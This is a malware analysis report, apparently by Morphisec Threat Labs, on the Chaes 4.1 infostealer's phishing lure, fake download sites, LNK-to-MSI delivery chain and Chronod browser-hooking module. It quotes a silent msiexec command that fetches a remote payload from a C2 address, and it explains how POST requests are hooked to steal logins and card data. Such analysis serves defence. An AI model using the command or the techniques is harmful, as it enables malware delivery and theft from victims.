Introduction
In ongoing efforts to monitor and analyze emerging cyber threats, Morphisec Threat Labs 
has recently turned its focus to Chae$ 4.1, an update to the Chaes malware Infostealer series. 
This version introduces key updates, including an improved Chronod module, and features 
a unique aspect: a direct message to the Morphisec team within the source code.
This analysis will cover the updates in Chae$ 4.1 and mention Morphisec’s initial interaction with 
the hackers, it will also cover several previously unknown details of the delivery chain. 
Infection Chain
Email
The infection chain starts with an email written in Portuguese, which purports to be an urgent 
communication request from a lawyer regarding a legal case. The email pressured the victim with 
an urgent call for “prompt response”, or risk highly adverse legal repercussions.  The email includes 
a link and a password to access the document from that link.

Attacker Controlled Websites | Fake/Compromised Websites
Upon clicking the provided link, the victim will be redirected to https://totalavprotection[.]shop/
abrirProcesso.php?email=<victims_email>. Then, the victim will be prompted to input the provided 
password to download the document, which is a ZIP file. This website https://totalavprotection[.]
shop additionally functions as a deceptive website for TotalAV, directly delivering the MSI installer 
without the intermediary step of a ZIP file.
Yet another website delivering the 
malicious payload directly as an MSI installer 
https://www.webcamcheck[.]online/ — a 
website that allegedly scans the machine 
for risks and suggests updating the machine’s 
driver after “scanning”. After the victim 
clicks the BLOCK button (marked in red), a 
JavaScript is executed in the background. 
The script is designed to mimic the 
appearance of a legitimate system scan. 
During the simulated scan, a hardcoded 
list of files is presented, giving the illusion of a 
comprehensive analysis of the victim’s computer.

Following the scan, the victim is then shown with a crafted message: “Security Risk Detected” and 
urges the victim to download an updated driver to install the latest version and eliminate the risk.
Clicking the button triggers the execution of a script named download.js. Whose purpose is to 
smuggle the malicious installer by decoding a zipped base64 blob. 
These examples illustrate the utilization of fake websites for delivering the malicious payload. 
Moreover, the threat actor implants the following PHP Webshells on compromised WordPress 
websites. This open-source tool enables web administrators to perform remote management 
without the use of cPanel. We assess that the threat actor is using it to push the malicious payload 
on those WordPress websites. For instance - https://chpost.eu[.]org/wp-content/Nota_%20

Downloaded ZIP
The download ZIP archive contains an LNK file named “Visualizar” (translated to Visualize in 
Portuguese) which matches the lure email.

LNK
Within the ZIP archive, there is an LNK file. Clicking this file initiates the execution of msiexec.exe, 
facilitating the remote download and execution of the next stage payload in silent mode with no 
user interface.
%systemroot%\system32\msiexec.exe /i http://54.207.253[.]173/DjXR/187/ogohude.msi /qn.
	
•    The C2 server only serves the payload upon receiving a request triggered by 
the execution of msiexec and has the following format: <C2 address>/*/*/*.msi. 
This determination is made on the server side by checking whether the User-Agent 
equals Windows Installer (which automatically prepend when msiexec requests the 
payload). Any alternative value for the User-Agent will result in the following:
MSI Installer
The downloaded MSI installer executes identical operations, whether obtained directly from the 
fake website or through the ZIP→LNK infection chain. The distinguishing factor lies in their size. 
Ordinarily, the version acquired directly from the deceptive or compromised website carries an 
approximate weight of ~100MB, resembling the one detailed in our prior report. In contrast, the 
version downloaded via the LNK infection chain removes padding from the JS script within the 
MSI, resulting in a reduced weight of just ~100KB.

From this point onward, the attack chain remains similar to Morphisec’s previous analysis, except 
for some adjustments in the Chae$ framework. It has advanced from version 4 to 4.1, primarily 
characterized by modifications in the Chronod module.

Chronod Module
As we described in our previous report the Chronod module is responsible for intercepting 
browser activity to steal information from the victim such as credentials sent on a login process, 
banking information when communicating with the bank’s website, and has a clipping 
functionality. We also mentioned this functionality spans more than 2,000 lines of code. The code 
has been adjusted to steal credentials from specific services such as WhatsApp, AWS, WordPress, 
etc., and a total of 25 such services (a full list can be found in the appendix of our previous report) 
with designated functionality for each service. However, in version 4.1 Chae$ team rewrote the 
Chronod module to be more generic and modular, instead of one class responsible for all of the 
functionality, they divided the logic into several classes.

The image above reveals a snipped code from the main class within the Chronod module. This class 
inherits from ChronodInternal, a class that leverages Google’s DevTools for managing various 
callbacks and establishing communication with Chromium based browsers. Among the browser 
hook callbacks integrated into this class are:
	
1.    hook_obta - Adds JS scripts to be evaluated on new document creation, including 
one that overrides the webdriver property in the browser’s navigator object. It also 
optionally adds a nice ASCII art banner if debug_mode is enabled.

2.    hook_obclo - Attached to the browser close event.
	
3.    hook_obmsg - Attached to browser messages, this hook, in particular, manages 
messages associated with network requests, specifically those tied to 
Network.requestWillBeSent. This hook examines all POST requests made by a browser 
and checks whether the request’s POST data aligns with a generic credit card or 
generic login attempt. This evaluation is conducted by checking for the presence of 
fields related to login attempts (such as user, password etc.) or credit card information 
(including card, cc, cvv etc.)
Chae$ team also uses the hooking infrastructure to handle the injection of the JS script 
responsible for replacing the QR Code in PIX transactions. Additionally, they have added the 
following “eco-friendly” ASCII art which is displayed when running in debug mode.

The stolen data, typically accompanied by a screenshot capturing the victim’s machine state 
at the time of theft, is sent to the C2 using the TsApi class. This class functions as a client, 
managing C2 communication and the encryption/decryption of requests. This class retrieves its 
C2 dynamically, similar to how it was handled in previous versions, by sending a DNS TXT record 
to cloudflare-dns.com.


Another interesting update was made in the Class responsible for parsing QrCodes, Chae$ team 
started using opencv-python to parse the QrCodes. But that is not just it, in that class they have 
added a function named greetings with a message to Morphisec security researchers, specifically 
addressing our latest research.
Examining the C2s employed 
throughout distinct phases 
of the framework unveils the 
presence of the Chae$ team 
panel login page.
The threat actor has a history 
of expressing appreciation to 
security researchers for helping 
in the improvement of their 
“software.” However, this is 
the first time such gratitude 
has been expressed directly 
within the code.
